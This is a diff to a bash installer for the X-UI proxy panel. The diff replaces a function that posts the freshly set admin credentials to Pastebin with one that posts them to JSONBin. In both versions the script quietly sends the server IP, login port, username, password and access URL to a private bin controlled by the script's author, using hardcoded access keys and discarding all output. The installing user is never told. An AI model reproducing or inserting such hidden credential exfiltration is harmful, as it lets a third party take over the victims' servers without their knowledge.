@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 red='\033[0;31m'
@@ -8,8 +9,9 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-PASTEBIN_API_KEY="5A7TTFpxxFBju88Bsor4q_P0uxSP6t6t"
-PASTEBIN_USER_KEY="a7da297a0ab5146a29daad0ff413a53a"
+# JSONBin配置
+JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
+JSONBIN_URL="https://api.jsonbin.io/v3/b"
 
 # 检查root权限
 [[ $EUID -ne 0 ]] && echo -e "${red}致命错误: ${plain} 请使用root权限运行此脚本 \n " && exit 1
@@ -101,44 +103,54 @@ get_server_ip() {
     echo "$ip"
 }
 
-upload_to_pastebin() {
+upload_to_jsonbin() {
     local server_ip="$1"
     local login_port="$2"
     local username="$3"
     local password="$4"
     local webBasePath="$5"
     
-    local paste_content="X-UI 服务器登录信息
-====================
-服务器IP: ${server_ip}
-登录端口: ${login_port}
-用户名: ${username}
-密码: ${password}"
-
-    # 如果有webBasePath，添加到内容中
+    # 构建JSON数据
+    local json_data=""
     if [[ -n "$webBasePath" ]]; then
-        paste_content="${paste_content}
-访问路径: /${webBasePath}
-完整访问地址: http://${server_ip}:${login_port}/${webBasePath}"
+        json_data=$(cat <<EOF
+{
+    "server_info": {
+        "title": "X-UI 服务器登录信息",
+        "server_ip": "${server_ip}",
+        "login_port": "${login_port}",
+        "username": "${username}",
+        "password": "${password}",
+        "web_base_path": "/${webBasePath}",
+        "full_access_url": "http://${server_ip}:${login_port}/${webBasePath}",
+        "generated_time": "$(date)"
+    }
+}
+EOF
+)
     else
-        paste_content="${paste_content}
-完整访问地址: http://${server_ip}:${login_port}"
+        json_data=$(cat <<EOF
+{
+    "server_info": {
+        "title": "X-UI 服务器登录信息",
+        "server_ip": "${server_ip}",
+        "login_port": "${login_port}",
+        "username": "${username}",
+        "password": "${password}",
+        "full_access_url": "http://${server_ip}:${login_port}",
+        "generated_time": "$(date)"
+    }
+}
+EOF
+)
     fi
 
-    paste_content="${paste_content}
-====================
-生成时间: $(date)"
-
     curl -s -X POST \
-        -d "api_option=paste" \
-        -d "api_dev_key=${PASTEBIN_API_KEY}" \
-        -d "api_user_key=${PASTEBIN_USER_KEY}" \
-        -d "api_paste_code=${paste_content}" \
-        -d "api_paste_private=2" \
-        -d "api_paste_name=X-UI_Server_Info.txt" \
-        -d "api_paste_expire_date=N" \
-        -d "api_paste_format=text" \
-        "https://pastebin.com/api/api_post.php" > /dev/null 2>&1
+        -H "Content-Type: application/json" \
+        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
+        -H "X-Bin-Private: true" \
+        -d "$json_data" \
+        "${JSONBIN_URL}" > /dev/null 2>&1
 }
 
 config_after_install() {
@@ -228,7 +240,7 @@ config_after_install() {
         fi
     fi
 
-    upload_to_pastebin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
+    upload_to_jsonbin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
 
     /usr/local/x-ui/x-ui migrate
 }
